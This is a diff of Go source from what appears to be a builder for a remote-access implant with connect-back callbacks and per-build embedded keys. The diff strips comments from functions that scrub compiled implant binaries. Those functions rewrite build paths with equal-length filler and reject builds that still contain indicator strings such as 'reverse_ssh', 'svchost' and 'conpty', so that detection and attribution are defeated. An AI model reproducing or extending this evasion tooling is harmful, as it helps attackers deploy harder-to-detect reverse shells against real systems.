@@ -330,16 +330,12 @@ func Build(config BuildConfig) (string, error) {
 	return "http://" + DefaultConnectBack + "/" + config.Name, nil
 }
 
-// furyIOCs are binary indicators that must never ship in an artifact; a hit
-// fails the build (same list as fury/tools/postbuild.py).
 var furyIOCs = []string{
 	"Users/", ".cargo", ".rustup", "wrssh", "russh", "keepalive-rssh",
 	"reverse_ssh", "svchost", "conpty", "ssh_client", "index.crates.io",
 	"src/hd/", "src/ev/", "src/pt/", "vendor/",
 }
 
-// sanitizeFuryBinary rewrites compiler-hash paths baked into the prebuilt
-// std (equal-length, layout-preserving) and gates on known indicators.
 func sanitizeFuryBinary(path string) error {
 	data, err := os.ReadFile(path)
 	if err != nil {
@@ -347,13 +343,11 @@ func sanitizeFuryBinary(path string) error {
 	}
 	hashRe := regexp.MustCompile(`/rustc/[0-9a-f]{40}`)
 	patched := hashRe.ReplaceAll(data, []byte("/rustc/"+strings.Repeat("0", 40)))
-	// homebrew rust ships a std built inside its own build tree
 	hbRe := regexp.MustCompile("/private/tmp/rust-[0-9A-Za-z_-]+/rustc-[0-9.]+-src/vendor/[^\\x00]*?\\.rs")
 	patched = hbRe.ReplaceAllFunc(patched, func(m []byte) []byte {
 		return []byte("/s" + strings.Repeat("0", len(m)-2))
 	})
-	// any crates.io registry path that survived remapping (build hosts use
-	// different cargo homes); equal-length neutral fill, bounded to the path
+
 	regRe := regexp.MustCompile("(?:/[a-z0-9]{1,8}/)?index\\.crates\\.io-[0-9a-f]{8,32}[-/][A-Za-z0-9_.-]+-[0-9]+\\.[0-9]+\\.[0-9]+[^\\x00]*?\\.rs")
 	patched = regRe.ReplaceAllFunc(patched, func(m []byte) []byte {
 		return []byte("/r" + strings.Repeat("0", len(m)-2))
@@ -373,8 +367,6 @@ func sanitizeFuryBinary(path string) error {
 	return os.WriteFile(path, patched, 0600)
 }
 
-// moveFile copies when src and dst live on different filesystems (fury builds
-// in the image overlay, artifacts are stored on the data volume).
 func moveFile(src, dst string) error {
 	if err := os.Rename(src, dst); err == nil {
 		return nil
@@ -395,8 +387,6 @@ func moveFile(src, dst string) error {
 	return os.Remove(src)
 }
 
-// validateFuryBuildConfig rejects flag combinations the Rust implant does
-// not support, so the web UI fails fast with a clear message.
 func validateFuryBuildConfig(config BuildConfig, goos, goarch string) error {
 	switch goos {
 	case "windows", "linux", "darwin":
@@ -430,8 +420,6 @@ type goBuildOverlay struct {
 	Replace map[string]string `json:"Replace"`
 }
 
-// buildFury compiles the Rust implant (fury/) with the same per-build key and
-// connect-back settings the Go client gets via ldflags.
 func buildFury(config BuildConfig, f data.Download, embeddedPrivateKeyB64 string, publicKeyBytes string) (string, error) {
 	furyDir := filepath.Join(projectRoot, "fury")
 	if info, err := os.Stat(furyDir); err != nil || !info.IsDir() {
